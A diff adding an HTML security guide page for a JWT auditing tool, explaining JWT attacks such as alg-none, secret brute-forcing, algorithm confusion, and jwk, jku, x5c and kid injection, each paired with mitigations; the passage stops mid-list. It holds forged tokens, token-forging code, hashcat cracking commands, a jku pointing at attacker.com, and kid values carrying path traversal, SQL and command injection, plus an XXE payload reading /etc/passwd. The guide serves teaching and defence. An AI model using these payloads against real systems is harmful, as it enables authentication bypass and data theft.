@@ -1,0 +1,1555 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JWT Vulnerabilities Guide - JWTAuditor</title>
+    <meta name="description" content="Comprehensive guide to JWT security vulnerabilities, exploitation techniques, and mitigation strategies.">
+    <meta name="keywords" content="JWT, security, vulnerabilities, algorithm none, key confusion, brute force">
+    <link rel="stylesheet" href="../css/styles.css">
+    <link rel="stylesheet" href="css/docs.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+    <link rel="icon" href="../img/logo.svg" type="image/svg+xml">
+</head>
+<body class="docs-body">
+    <header>
+        <div class="logo">
+            <i class="fas fa-user-secret"></i>
+            <h1>JWTAuditor</h1>
+        </div>
+        <div class="subtitle">Documentation & Learning Resources</div>
+        <div class="header-actions">
+            <a href="../index.html" class="header-btn tool-btn"><i class="fas fa-tools"></i> Back to Tool</a>
+        </div>
+    </header>
+
+    <main class="docs-main">
+        <div class="docs-container">
+            <aside class="docs-sidebar">
+                <div class="sidebar-header">
+                    <h2>Documentation</h2>
+                </div>
+                <nav class="docs-nav">
+                    <div class="nav-section">
+                        <h3>JWT Fundamentals</h3>
+                        <ul>
+                            <li><a href="jwt-fundamentals.html">Understanding JWT Structure</a></li>
+                            <li><a href="jwt-claims.html">JWT Claims Explained</a></li>
+                            <li><a href="jwt-vs-sessions.html">JWT vs. Session Auth</a></li>
+                        </ul>
+                    </div>
+                    <div class="nav-section">
+                        <h3>Security Guides</h3>
+                        <ul>
+                            <li><a href="jwt-vulnerabilities-guide.html" class="active">JWT Vulnerabilities Guide</a></li>
+                            <li><a href="secure-jwt-implementation.html">Secure Implementation</a></li>
+                            <li><a href="jwt-attack-techniques.html">Attack Techniques</a></li>
+                        </ul>
+                    </div>
+                    <div class="nav-section">
+                        <h3>Tool Guides</h3>
+                        <ul>
+                            <li><a href="tool-guides/decoder-analyzer.html">Decoder & Analyzer</a></li>
+                            <li><a href="tool-guides/secret-bruteforcer.html">Secret Bruteforcer</a></li>
+                            <li><a href="tool-guides/jwt-editor.html">JWT Editor</a></li>
+                            <li><a href="tool-guides/jwt-generator.html">JWT Generator</a></li>
+                        </ul>
+                    </div>
+                    <div class="nav-section">
+                        <h3>Reference</h3>
+                        <ul>
+                            <li><a href="reference/jwt-header-parameters.html">Header Parameters</a></li>
+                            <li><a href="reference/jwt-claim-registry.html">Claim Registry</a></li>
+                            <li><a href="reference/jwt-algorithms.html">JWT Algorithms</a></li>
+                        </ul>
+                    </div>
+                </nav>
+            </aside>
+
+            <div class="docs-content">
+                <div class="docs-header">
+                    <h1>JWT Vulnerabilities Guide</h1>
+                    <div class="docs-meta">
+                        <span><i class="fas fa-user-secret"></i> Security Guide</span>
+                        <span><i class="fas fa-clock"></i> Reading time: 15 min</span>
+                    </div>
+                </div>
+
+                <div class="docs-section intro-section">
+                    <p class="lead">
+                        JSON Web Tokens (JWTs) have become the de facto standard for implementing authentication and authorization in modern web applications. However, their widespread adoption has also made them a prime target for attackers. This guide explores common JWT vulnerabilities, exploitation techniques, and best practices for secure implementation.
+                    </p>
+                    
+                    <div class="warning-box">
+                        <div class="warning-icon"><i class="fas fa-exclamation-triangle"></i></div>
+                        <div class="warning-content">
+                            <p><strong>Important:</strong> This guide is provided for educational purposes only. Always use your knowledge responsibly and ethically. Never attempt to exploit vulnerabilities in systems without explicit permission.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="docs-section">
+                    <h2>Table of Contents</h2>
+                    <ul class="toc-list">
+                        <li><a href="#algorithm-none">Algorithm None Attack</a></li>
+                        <li><a href="#symmetric-key">Symmetric Key Bruteforcing</a></li>
+                        <li><a href="#algorithm-confusion">Algorithm Confusion Attack</a></li>
+                        <li><a href="#jwk-injection">JWK Header Injection</a></li>
+                        <li><a href="#jku-injection">JWK Set URL Injection</a></li>
+                        <li><a href="#kid-injection">Key ID (kid) Parameter Injection</a></li>
+                        <li><a href="#arbitrary-signatures">Accepting Arbitrary Signatures</a></li>
+                        <li><a href="#x5c-injection">X.509 Certificate Chain Injection</a></li>
+                        <li><a href="#cty-manipulation">Content Type Manipulation</a></li>
+                        <li><a href="#sensitive-data">Sensitive Data Exposure</a></li>
+                        <li><a href="#missing-claims">Missing or Misused Claims</a></li>
+                        <li><a href="#replay-attacks">Replay Attacks</a></li>
+                        <li><a href="#weak-secrets">Weak Secrets</a></li>
+                        <li><a href="#token-invalidation">Token Invalidation Issues</a></li>
+                        <li><a href="#token-substitution">Token Substitution Attacks</a></li>
+                    </ul>
+                </div>
+
+                <div id="algorithm-none" class="docs-section">
+                    <h2>Algorithm None Attack</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        The JWT specification allows for an "alg" value of "none" to indicate that the token is unsecured. Some JWT libraries may accept tokens with the "alg" header set to "none" and skip signature verification entirely.
+                    </p>
+                    
+                    <h3>Why is it dangerous?</h3>
+                    <p>
+                        If a server accepts tokens with the "alg" header set to "none", an attacker can forge valid tokens without knowing the secret key, effectively bypassing authentication.
+                    </p>
+                    
+                    <h3>How to exploit it</h3>
+                    <ol>
+                        <li>Decode an existing JWT to access its payload</li>
+                        <li>Create a new JWT with the same payload but change the header to <code>{"alg": "none"}</code></li>
+                        <li>Set the signature part to an empty string</li>
+                        <li>Send the modified token to the server</li>
+                    </ol>
+                    
+                    <pre><code class="language-text">// Original token
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+// Modified token with "alg: none"
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.</code></pre>
+                    
+                    <h3>How to fix it</h3>
+                    <ol>
+                        <li>Explicitly reject tokens with "alg: none" in your JWT verification code</li>
+                        <li>Use a library that doesn't support "none" algorithm by default</li>
+                        <li>Implement a whitelist of allowed algorithms rather than a blacklist of disallowed ones</li>
+                    </ol>
+                    
+                    <pre><code class="language-javascript">// Example in Node.js with jsonwebtoken library
+jwt.verify(token, secret, { 
+  algorithms: ['HS256', 'RS256'] // Explicitly specify allowed algorithms
+});</code></pre>
+                </div>
+
+                <div id="symmetric-key" class="docs-section">
+                    <h2>Symmetric Key Bruteforcing</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        When JWTs are signed with HMAC algorithms (HS256, HS384, HS512), they rely on a shared secret key. If this secret is weak, predictable, or has low entropy, it can be bruteforced by attackers.
+                    </p>
+                    
+                    <h3>Why is it dangerous?</h3>
+                    <p>
+                        Once an attacker discovers the secret key, they can:
+                    </p>
+                    <ul>
+                        <li>Create new tokens with any payload they want</li>
+                        <li>Modify existing tokens without detection</li>
+                        <li>Impersonate any user in the system</li>
+                        <li>Escalate privileges to administrator level</li>
+                    </ul>
+                    
+                    <h3>How to exploit it</h3>
+                    <ol>
+                        <li>Obtain a valid JWT token</li>
+                        <li>Use a dictionary or brute force attack to guess the secret</li>
+                        <li>Common weak secrets include: "secret", "password", "123456", company names, etc.</li>
+                        <li>Use tools like JWTAuditor Secret Bruteforcer, hashcat, or custom scripts</li>
+                    </ol>
+                    
+                    <h4>Using Hashcat for JWT Secret Brute-forcing</h4>
+                    <p>Hashcat is one of the most effective tools for brute-forcing JWT secrets:</p>
+                    
+                    <pre><code class="language-bash"># Basic hashcat command for JWT (mode 16500)
+hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+
+# With optimized workload
+hashcat -a 0 -m 16500 -w 3 jwt.txt wordlist.txt
+
+# Show cracked results
+hashcat -a 0 -m 16500 jwt.txt wordlist.txt --show
+
+# Using a popular JWT secrets wordlist
+wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt_auditor_potential_secrets.txt
+hashcat -a 0 -m 16500 jwt.txt jwt_auditor_potential_secrets.txt</code></pre>
+                    
+                    <p>Hashcat output format when secret is found:</p>
+                    <pre><code class="language-text">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c:secret</code></pre>
+                    
+                    <h4>Common weak secrets to test</h4>
+                    <ul>
+                        <li><code>secret</code></li>
+                        <li><code>password</code></li>
+                        <li><code>123456</code></li>
+                        <li><code>jwt</code></li>
+                        <li><code>your-256-bit-secret</code></li>
+                        <li><code>HS256</code></li>
+                        <li><code>default</code></li>
+                        <li><code>admin</code></li>
+                        <li><code>secretkey</code></li>
+                        <li>Company name or project name</li>
+                        <li>Default examples from documentation</li>
+                    </ul>
+                    
+                    <h4>Other tools for JWT secret brute-forcing</h4>
+                    <pre><code class="language-bash"># Using jwt-cracker (Node.js tool)
+npm install -g jwt-cracker
+jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." "secret"
+
+# Using custom Python script
+python3 jwt_bruteforce.py --jwt "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." --wordlist wordlist.txt</code></pre>
+                    
+                    <h3>How to fix it</h3>
+                    <ul>
+                        <li>Use cryptographically secure random secrets of at least 256 bits (32 bytes)</li>
+                        <li>Never use dictionary words, predictable patterns, or company-related terms</li>
+                        <li>Consider using asymmetric algorithms (RS256, ES256) instead</li>
+                        <li>Rotate secrets regularly</li>
+                        <li>Use environment variables or secure key management systems</li>
+                    </ul>
+                    
+                    <pre><code class="language-javascript">// Good: Generate a strong secret
+const crypto = require('crypto');
+const secret = crypto.randomBytes(32).toString('hex');
+
+// Bad: Weak secrets
+const secret = "secret";
+const secret = "mycompany123";
+const secret = "password";</code></pre>
+                </div>
+
+                <div id="algorithm-confusion" class="docs-section">
+                    <h2>Algorithm Confusion Attack</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        Algorithm confusion attacks exploit JWT implementations that don't properly validate the algorithm specified in the token header. The most common variant involves switching from an asymmetric algorithm (like RS256) to a symmetric one (like HS256).
+                    </p>
+                    
+                    <h3>Why is it dangerous?</h3>
+                    <p>
+                        In a typical RS256 setup, the server uses a private key to sign tokens and a public key to verify them. If an attacker can change the algorithm to HS256, the server might use the public key as an HMAC secret, allowing the attacker to forge valid tokens.
+                    </p>
+                    
+                    <h3>How to exploit it</h3>
+                    <ol>
+                        <li>Obtain a JWT signed with RS256</li>
+                        <li>Extract or find the public key (often available at /.well-known/jwks.json)</li>
+                        <li>Change the algorithm from RS256 to HS256 in the header</li>
+                        <li>Sign the token using HS256 with the public key as the secret</li>
+                        <li>Send the modified token to the server</li>
+                    </ol>
+                    
+                    <pre><code class="language-javascript">// Original header
+{
+  "alg": "RS256",
+  "typ": "JWT"
+}
+
+// Modified header
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+// Python example to create the attack token
+import jwt
+
+# Public key extracted from the server
+public_key = """-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
+-----END PUBLIC KEY-----"""
+
+# Create a malicious token
+payload = {"sub": "admin", "role": "administrator"}
+malicious_token = jwt.encode(payload, public_key, algorithm="HS256")</code></pre>
+                    
+                    <h3>How to fix it</h3>
+                    <ul>
+                        <li>Always validate the algorithm and reject unexpected algorithms</li>
+                        <li>Use algorithm whitelisting, not blacklisting</li>
+                        <li>Ensure your JWT library performs strict algorithm validation</li>
+                        <li>Use different keys for different algorithms</li>
+                    </ul>
+                    
+                    <pre><code class="language-javascript">// Node.js example - secure verification
+const jwt = require('jsonwebtoken');
+
+try {
+    const decoded = jwt.verify(token, publicKey, {
+        algorithms: ['RS256'], // Only allow RS256
+        issuer: 'trusted-issuer',
+        audience: 'my-service'
+    });
+} catch (err) {
+    // Token is invalid
+    console.error('Token verification failed:', err.message);
+}</code></pre>
+                </div>
+
+                <div id="jwk-injection" class="docs-section">
+                    <h2>JWK Header Injection</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        The JSON Web Signature (JWS) specification allows an optional "jwk" header parameter, which can embed a public key directly within the token in JWK format. Misconfigured servers may accept any key provided in this parameter without proper validation.
+                    </p>
+                    
+                    <h3>Why is it dangerous?</h3>
+                    <p>
+                        If a server accepts tokens with arbitrary "jwk" header parameters, attackers can:
+                    </p>
+                    <ul>
+                        <li>Generate their own RSA key pair</li>
+                        <li>Sign a malicious JWT with their private key</li>
+                        <li>Embed the corresponding public key in the "jwk" header</li>
+                        <li>The server will use the attacker's public key to verify the signature</li>
+                    </ul>
+                    
+                    <h3>Example attack</h3>
+                    <p>Here's how an attacker might exploit this vulnerability:</p>
+                    
+                    <pre><code class="language-json">{
+  "alg": "RS256",
+  "typ": "JWT",
+  "jwk": {
+    "kty": "RSA",
+    "e": "AQAB",
+    "kid": "attacker-key-123",
+    "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m..."
+  }
+}</code></pre>
+                    
+                    <h3>How to fix it</h3>
+                    <ul>
+                        <li>Never accept arbitrary keys from JWT headers</li>
+                        <li>Use a strict whitelist of trusted public keys</li>
+                        <li>Store trusted keys server-side, not in the token</li>
+                        <li>If using "jwk" parameter, validate the key against a known set</li>
+                    </ul>
+                    
+                    <pre><code class="language-javascript">// Node.js example - secure key validation
+const trustedKeys = [
+    { kid: 'key-1', key: fs.readFileSync('public-key-1.pem') },
+    { kid: 'key-2', key: fs.readFileSync('public-key-2.pem') }
+];
+
+function getVerificationKey(header) {
+    // Only use pre-configured trusted keys
+    const trustedKey = trustedKeys.find(k => k.kid === header.kid);
+    if (!trustedKey) {
+        throw new Error('Untrusted key ID');
+    }
+    return trustedKey.key;
+}</code></pre>
+                </div>
+
+                <div id="jku-injection" class="docs-section">
+                    <h2>JWK Set URL Injection</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        The "jku" (JWK Set URL) header parameter allows servers to reference a JWK Set containing verification keys from a URL. If not properly validated, attackers can provide URLs pointing to their own malicious key sets.
+                    </p>
+                    
+                    <h3>Why is it dangerous?</h3>
+                    <p>
+                        Vulnerable implementations may:
+                    </p>
+                    <ul>
+                        <li>Fetch keys from attacker-controlled URLs</li>
+                        <li>Accept malicious keys from untrusted sources</li>
+                        <li>Be vulnerable to SSRF attacks</li>
+                        <li>Allow attackers to bypass authentication entirely</li>
+                    </ul>
+                    
+                    <h3>Example attack</h3>
+                    <p>An attacker creates a malicious JWT with a "jku" header pointing to their server:</p>
+                    
+                    <pre><code class="language-json">{
+  "alg": "RS256",
+  "typ": "JWT",
+  "jku": "https://attacker.com/malicious-jwks.json",
+  "kid": "attacker-key-1"
+}</code></pre>
+                    
+                    <p>The malicious JWK Set on the attacker's server:</p>
+                    
+                    <pre><code class="language-json">{
+  "keys": [
+    {
+      "kty": "RSA",
+      "kid": "attacker-key-1",
+      "e": "AQAB",
+      "n": "malicious-key-data..."
+    }
+  ]
+}</code></pre>
+                    
+                    <h3>How to fix it</h3>
+                    <ul>
+                        <li>Implement strict URL validation and whitelisting</li>
+                        <li>Only allow JWK Set URLs from trusted domains</li>
+                        <li>Use URL parsing libraries that prevent bypasses</li>
+                        <li>Implement proper error handling for unreachable URLs</li>
+                        <li>Consider disabling "jku" parameter entirely</li>
+                    </ul>
+                    
+                    <pre><code class="language-javascript">// Node.js example - secure JKU validation
+const TRUSTED_DOMAINS = ['auth.company.com', 'keys.company.com'];
+
+function validateJkuUrl(jku) {
+    try {
+        const url = new URL(jku);
+        
+        // Only allow HTTPS
+        if (url.protocol !== 'https:') {
+            throw new Error('JKU must use HTTPS');
+        }
+        
+        // Check against trusted domains
+        if (!TRUSTED_DOMAINS.includes(url.hostname)) {
+            throw new Error('JKU domain not trusted');
+        }
+        
+        return true;
+    } catch (error) {
+        console.error('Invalid JKU URL:', error.message);
+        return false;
+    }
+}</code></pre>
+                </div>
+
+                <div id="arbitrary-signatures" class="docs-section">
+                    <h2>Accepting Arbitrary Signatures</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        Some JWT implementations fail to properly verify signatures at all. This can happen when developers confuse JWT decoding methods with verification methods, or when signature verification is accidentally bypassed.
+                    </p>
+                    
+                    <h3>Why is it dangerous?</h3>
+                    <p>
+                        Without proper signature verification:
+                    </p>
+                    <ul>
+                        <li>Attackers can modify any part of the JWT payload</li>
+                        <li>Token integrity is completely compromised</li>
+                        <li>Authentication and authorization can be bypassed</li>
+                        <li>Any arbitrary claims can be injected</li>
+                    </ul>
+                    
+                    <h3>Common vulnerable patterns</h3>
+                    
+                    <h4>1. Using decode() instead of verify()</h4>
+                    <pre><code class="language-javascript">// VULNERABLE - No signature verification
+const decoded = jwt.decode(token);
+const userId = decoded.sub;
+
+// SECURE - Proper signature verification
+const decoded = jwt.verify(token, secretKey);
+const userId = decoded.sub;</code></pre>
+                    
+                    <h4>2. Catching verification errors incorrectly</h4>
+                    <pre><code class="language-javascript">// VULNERABLE - Accepting tokens even if verification fails
+try {
+    const decoded = jwt.verify(token, secretKey);
+} catch (error) {
+    // Still processing the token despite verification failure
+    const decoded = jwt.decode(token);
+    return decoded;
+}</code></pre>
+                    
+                    <h4>3. Conditional verification bypass</h4>
+                    <pre><code class="language-python"># VULNERABLE - Bypassing verification in certain conditions
+def verify_token(token):
+    if is_development_mode():
+        return jwt.decode(token, options={"verify_signature": False})
+    else:
+        return jwt.decode(token, secret_key, algorithms=["HS256"])</code></pre>
+                    
+                    <h3>How to fix it</h3>
+                    <ul>
+                        <li>Always use proper verification methods (verify(), not decode())</li>
+                        <li>Never bypass signature verification, even in development</li>
+                        <li>Handle verification errors securely</li>
+                        <li>Use JWT libraries correctly and follow their documentation</li>
+                        <li>Implement proper error handling that doesn't fall back to unsafe methods</li>
+                    </ul>
+                </div>
+
+                <div id="x5c-injection" class="docs-section">
+                    <h2>X.509 Certificate Chain Injection</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        The "x5c" (X.509 Certificate Chain) header parameter can contain X.509 public key certificates. If not properly validated, attackers can inject self-signed certificates to bypass signature verification.
+                    </p>
+                    
+                    <h3>Why is it dangerous?</h3>
+                    <p>
+                        Vulnerable implementations may:
+                    </p>
+                    <ul>
+                        <li>Accept self-signed certificates without validation</li>
+                        <li>Trust any certificate provided in the header</li>
+                        <li>Skip proper certificate chain validation</li>
+                        <li>Allow attackers to sign tokens with their own certificates</li>
+                    </ul>
+                    
+                    <h3>Example attack</h3>
+                    <p>An attacker creates a self-signed certificate and includes it in the JWT header:</p>
+                    
+                    <pre><code class="language-json">{
+  "alg": "RS256",
+  "typ": "JWT",
+  "x5c": [
+    "MIICDTCCAXYCCQDFkjsdf...self-signed-cert...",
+    "MIIBkTCB+wIBADBXMQswCQYDVQQGEwJVUzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDU..."
+  ]
+}</code></pre>
+                    
+                    <h3>How to fix it</h3>
+                    <ul>
+                        <li>Implement proper certificate validation</li>
+                        <li>Verify certificates against trusted Certificate Authorities</li>
+                        <li>Check certificate expiration dates</li>
+                        <li>Validate the entire certificate chain</li>
+                        <li>Use certificate pinning when possible</li>
+                    </ul>
+                    
+                    <pre><code class="language-python"># Python example - secure certificate validation
+import ssl
+import certifi
+from cryptography import x509
+from cryptography.hazmat.backends import default_backend
+
+def validate_x5c_certificates(x5c_header):
+    try:
+        # Parse the first certificate
+        cert_der = base64.b64decode(x5c_header[0])
+        cert = x509.load_der_x509_certificate(cert_der, default_backend())
+        
+        # Verify certificate is not self-signed
+        if cert.issuer == cert.subject:
+            raise ValueError("Self-signed certificates not allowed")
+        
+        # Verify certificate is not expired
+        now = datetime.utcnow()
+        if cert.not_valid_after < now:
+            raise ValueError("Certificate has expired")
+        
+        # Additional validation logic...
+        return cert.public_key()
+        
+    except Exception as e:
+        raise ValueError(f"Certificate validation failed: {str(e)}")</code></pre>
+                </div>
+
+                <div id="cty-manipulation" class="docs-section">
+                    <h2>Content Type Manipulation</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        The "cty" (Content Type) header parameter can declare the media type of the JWT payload. If signature verification is bypassed, attackers might manipulate this parameter to enable new attack vectors like XXE or deserialization attacks.
+                    </p>
+                    
+                    <h3>Why is it dangerous?</h3>
+                    <p>
+                        Manipulating the content type can enable:
+                    </p>
+                    <ul>
+                        <li>XML External Entity (XXE) attacks by setting cty to "text/xml"</li>
+                        <li>Deserialization attacks with "application/x-java-serialized-object"</li>
+                        <li>Other payload parsing vulnerabilities</li>
+                        <li>Bypass of content-type based security controls</li>
+                    </ul>
+                    
+                    <h3>Example attack</h3>
+                    <p>After bypassing signature verification, an attacker might use:</p>
+                    
+                    <pre><code class="language-json">{
+  "alg": "none",
+  "typ": "JWT",
+  "cty": "text/xml"
+}</code></pre>
+                    
+                    <p>With a malicious XML payload:</p>
+                    
+                    <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;user&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;role&gt;admin&lt;/role&gt;
+&lt;/user&gt;</code></pre>
+                    
+                    <h3>How to fix it</h3>
+                    <ul>
+                        <li>Always verify JWT signatures properly</li>
+                        <li>Don't process content-type headers from unverified tokens</li>
+                        <li>Use strict content-type validation</li>
+                        <li>Disable XML processing for JWT payloads</li>
+                        <li>Implement proper input validation regardless of content type</li>
+                    </ul>
+                    
+                    <pre><code class="language-javascript">// Node.js example - secure content type handling
+function processJWT(token) {
+    // Always verify signature first
+    const decoded = jwt.verify(token, secretKey);
+    
+    // Only accept standard JSON payloads
+    if (decoded.header.cty && decoded.header.cty !== 'application/json') {
+        throw new Error('Unsupported content type');
+    }
+    
+    // Process the verified payload
+    return decoded.payload;
+}</code></pre>
+                </div>
+
+                <div id="sensitive-data" class="docs-section">
+                    <h2>Sensitive Data Exposure</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        JWTs are encoded (Base64URL) but not encrypted by default. The payload is easily readable by anyone who has the token. Developers sometimes mistakenly include sensitive information in JWT payloads.
+                    </p>
+                    
+                    <h3>Why is it dangerous?</h3>
+                    <p>
+                        Sensitive data in JWT payloads can be:
+                    </p>
+                    <ul>
+                        <li>Viewed by anyone with access to the token</li>
+                        <li>Logged in server logs, browser history, or network traffic</li>
+                        <li>Exposed through XSS attacks if stored in localStorage</li>
+                        <li>Accidentally shared in URLs or error messages</li>
+                    </ul>
+                    
+                    <h3>Examples of sensitive data</h3>
+                    <ul>
+                        <li>Passwords or password hashes</li>
+                        <li>Social security numbers</li>
+                        <li>Credit card information</li>
+                        <li>Personal identification numbers</li>
+                        <li>Internal system information</li>
+                        <li>Database connection strings</li>
+                    </ul>
+                    
+                    <pre><code class="language-json">// BAD: Sensitive data in JWT
+{
+  "sub": "user123",
+  "name": "John Doe",
+  "ssn": "123-45-6789",
+  "password": "hashedpassword123",
+  "api_key": "secret-api-key-xyz",
+  "salary": 75000,
+  "credit_card": "4111-1111-1111-1111"
+}</code></pre>
+                    
+                    <h3>How to fix it</h3>
+                    <ul>
+                        <li>Never include sensitive data in JWT payloads</li>
+                        <li>Use minimal claims (only what's necessary for authorization)</li>
+                        <li>Store sensitive data on the server, reference it by ID in the token</li>
+                        <li>Use JWE (JSON Web Encryption) for confidential data</li>
+                        <li>Audit your JWT payloads regularly</li>
+                    </ul>
+                    
+                    <pre><code class="language-json">// GOOD: Minimal, non-sensitive claims
+{
+  "sub": "user123",
+  "role": "user",
+  "permissions": ["read", "write"],
+  "exp": 1516242622,
+  "iat": 1516239022
+}</code></pre>
+                </div>
+
+                <div id="missing-claims" class="docs-section">
+                    <h2>Missing or Misused Claims</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        JWT provides several standard claims (exp, iat, nbf, aud, iss, sub, jti) that help ensure tokens are used correctly. Missing or improperly validated claims can lead to security vulnerabilities.
+                    </p>
+                    
+                    <h3>Common missing claims and their risks</h3>
+                    
+                    <h4>1. Missing Expiration (exp)</h4>
+                    <ul>
+                        <li>Tokens never expire, creating indefinite access</li>
+                        <li>Compromised tokens remain valid forever</li>
+                        <li>No mechanism to force re-authentication</li>
+                    </ul>
+                    
+                    <h4>2. Missing Audience (aud)</h4>
+                    <ul>
+                        <li>Token substitution attacks across different services</li>
+                        <li>Tokens intended for one service can be used on another</li>
+                        <li>Lack of service-specific validation</li>
+                    </ul>
+                    
+                    <h4>3. Missing Issuer (iss)</h4>
+                    <ul>
+                        <li>Can't verify which service created the token</li>
+                        <li>Tokens from untrusted sources may be accepted</li>
+                        <li>Difficult to trace token origin</li>
+                    </ul>
+                    
+                    <h4>4. Missing Not Before (nbf)</h4>
+                    <ul>
+                        <li>Tokens can be used before their intended activation time</li>
+                        <li>Premature token usage</li>
+                    </ul>
+                    
+                    <h3>How to fix it</h3>
+                    <ul>
+                        <li>Always include expiration (exp) claims</li>
+                        <li>Set appropriate expiration times (15-30 minutes for access tokens)</li>
+                        <li>Include audience (aud) claims and validate them</li>
+                        <li>Include issuer (iss) claims and validate them</li>
+                        <li>Use issued at (iat) claims for clock skew handling</li>
+                        <li>Include JWT ID (jti) for token revocation capabilities</li>
+                    </ul>
+                    
+                    <pre><code class="language-javascript">// Complete token validation
+const jwt = require('jsonwebtoken');
+
+const options = {
+    issuer: 'trusted-auth-server',
+    audience: 'my-api-service',
+    expiresIn: '15m',
+    algorithm: 'RS256'
+};
+
+try {
+    const decoded = jwt.verify(token, publicKey, options);
+    
+    // Additional validations
+    if (!decoded.sub) {
+        throw new Error('Missing subject claim');
+    }
+    
+    if (!decoded.iat) {
+        throw new Error('Missing issued at claim');
+    }
+    
+    // Check clock skew
+    const now = Math.floor(Date.now() / 1000);
+    const clockSkew = 60; // Allow 60 seconds of clock skew
+    
+    if (decoded.iat > now + clockSkew) {
+        throw new Error('Token used before issued');
+    }
+    
+} catch (err) {
+    console.error('Token validation failed:', err.message);
+}</code></pre>
+                </div>
+
+                <div id="kid-injection" class="docs-section">
+                    <h2>Key ID (kid) Parameter Injection</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        The "kid" (Key ID) parameter in JWT headers specifies which key should be used for verification. Servers may use this parameter to identify the correct key from a database, file system, or JWK Set. If not properly validated, attackers can manipulate this parameter to exploit various vulnerabilities.
+                    </p>
+                    
+                    <h3>Why is it dangerous?</h3>
+                    <p>
+                        Attackers can manipulate the "kid" parameter to:
+                    </p>
+                    <ul>
+                        <li>Exploit directory traversal vulnerabilities</li>
+                        <li>Access arbitrary files from the server's filesystem</li>
+                        <li>Force the use of predictable or empty keys</li>
+                        <li>Exploit SQL injection vulnerabilities</li>
+                        <li>Reference keys they control</li>
+                    </ul>
+                    
+                    <h3>Common attack scenarios</h3>
+                    
+                    <h4>1. Directory Traversal Attack</h4>
+                    <p>If the server uses the "kid" parameter to reference files, attackers can use directory traversal to access other files:</p>
+                    <pre><code class="language-json">{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "../../etc/passwd"
+}</code></pre>
+                    
+                    <h4>2. Empty Key Attack (/dev/null)</h4>
+                    <p>One of the most effective attacks is to point the "kid" parameter to a predictable, empty file like /dev/null:</p>
+                    <pre><code class="language-json">{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "../../../../dev/null"
+}</code></pre>
+                    <p>Since /dev/null is empty, the server will use an empty string as the signing key. An attacker can then sign their malicious JWT with an empty string.</p>
+                    
+                    <h4>3. SQL Injection</h4>
+                    <p>If the "kid" parameter is used in SQL queries without proper sanitization:</p>
+                    <pre><code class="language-json">{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "key1' UNION SELECT 'attack-key' FROM users WHERE admin=1--"
+}</code></pre>
+                    
+                    <h4>4. Command Injection</h4>
+                    <pre><code class="language-json">{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "key1; cat /etc/passwd"
+}</code></pre>
+                    
+                    <h4>5. URL Manipulation</h4>
+                    <pre><code class="language-json">{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "http://attacker.com/malicious-key"
+}</code></pre>
+                    
+                    <h3>Practical exploitation example</h3>
+                    <p>Here's how an attacker might exploit the /dev/null technique:</p>
+                    
+                    <pre><code class="language-bash"># Step 1: Create a malicious JWT with /dev/null as the kid
+# Header: {"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}
+# Payload: {"sub": "admin", "role": "admin", "exp": 1999999999}
+
+# Step 2: Sign the JWT with an empty string as the key
+import jwt
+payload = {"sub": "admin", "role": "admin", "exp": 1999999999}
+malicious_token = jwt.encode(payload, "", algorithm="HS256")
+
+# Step 3: Use the malicious token to bypass authentication</code></pre>
+                    
+                    <h3>How to fix it</h3>
+                    <ul>
+                        <li>Implement strict whitelist validation for "kid" values</li>
+                        <li>Use only alphanumeric characters and underscores in key IDs</li>
+                        <li>Never use the "kid" parameter directly in file paths or SQL queries</li>
+                        <li>Store keys in a secure location inaccessible via path traversal</li>
+                        <li>Use parameterized queries if storing keys in a database</li>
+                        <li>Implement proper input validation and sanitization</li>
